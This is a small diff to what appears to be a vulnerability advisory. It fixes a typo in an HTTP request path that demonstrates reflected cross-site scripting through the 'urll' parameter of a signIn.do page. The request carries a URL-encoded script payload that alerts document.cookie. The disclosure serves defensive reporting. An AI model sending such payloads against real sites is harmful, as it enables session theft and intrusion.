@@ -11,7 +11,7 @@ The value of the `urll` parameter is getting reflected without an sanitization, 
 
 Request:
 ```
-GET /r2w/singIn.do?urll=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
+GET /r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
 Host: [HOST]
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
